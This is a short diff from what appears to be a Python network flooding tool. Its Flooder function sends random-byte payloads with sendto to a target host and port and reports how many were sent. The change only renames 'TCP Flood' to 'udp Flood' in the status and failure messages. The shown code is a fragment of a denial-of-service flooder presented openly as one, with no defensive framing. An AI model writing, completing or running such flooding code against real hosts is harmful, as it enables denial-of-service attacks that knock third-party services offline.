@@ -41,9 +41,9 @@ def Flooder(**pHu):
         z3Payload = randbytes(bytesX)
         sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
         count+=1
-        return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
+        return f"SEND {count} udp Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
     except:
-        return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
+        return f"udp Flood Failed On {pHu['host_ip']}:{pHu['port']}"
     finally:
        sVar.close()
     
